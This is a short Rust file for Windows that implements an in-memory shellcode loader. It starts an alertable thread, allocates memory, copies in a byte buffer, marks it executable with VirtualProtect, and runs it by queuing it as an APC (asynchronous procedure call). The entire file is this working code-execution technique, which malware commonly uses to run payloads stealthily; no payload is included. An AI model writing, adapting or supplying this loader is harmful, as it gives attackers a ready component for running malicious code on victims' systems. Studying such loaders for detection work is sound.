use std::mem::transmute;
use std::{
    ffi::c_void,
    ptr::copy_nonoverlapping,
};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, 
    MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateThread, QueueUserAPC, SleepEx, 
    WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS,
};
use windows::core::Result;

unsafe extern "system" fn hello(_:*mut c_void)->u32{
    unsafe {
        SleepEx(INFINITE, true);
    }
    return 0;
}

pub(crate) fn apc(buf:&[u8])->Result<()>{

    unsafe {
        //CreateThread
        let thread_handler=CreateThread(None,0,Some(hello),None,THREAD_CREATION_FLAGS(0),None)?;

        //VirtualAlloc
        let addr=VirtualAlloc(None, buf.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        //move
        copy_nonoverlapping(buf.as_ptr() as *mut c_void, addr, buf.len());

        //VirtualProtect
        let mut lp=PAGE_PROTECTION_FLAGS(0);
        let _=VirtualProtect(addr, buf.len(), PAGE_EXECUTE_READ, &mut lp);

        //QueueUserAPC
        QueueUserAPC(Some(transmute(addr)), thread_handler, 0);

        //等待子线程执行完毕再结束
        WaitForSingleObject(thread_handler, INFINITE);
    }
    Ok(())
}